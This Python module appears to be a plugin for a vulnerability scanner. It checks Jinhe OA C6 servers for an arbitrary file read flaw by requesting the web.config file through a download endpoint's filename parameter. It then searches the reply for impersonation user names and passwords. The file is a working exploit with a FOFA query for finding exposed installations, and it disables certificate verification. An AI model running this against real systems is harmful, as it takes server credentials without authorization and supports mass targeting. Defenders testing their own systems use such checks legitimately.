#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://peiqi.wgpsec.org/wiki/oa/金和OA/金和OA C6 download.jsp 任意文件读取漏洞.html',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   '金和OA C6 download.jsp 任意文件读取',

      'level'     :   'medium',

      'FOFA'      :   'app="金和网络-金和OA"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,

  }
  return ret

def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/C6/Jhsoft.Web.module/testbill/dj/download.asp?filename=/c6/web.config'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'identity.*?impersonate.*?userName.*?password.*?',res.text,re.S):
      ret['ifbug'] = True
      res.close()
      return ret
    else:
      return ret
  except:
    return ret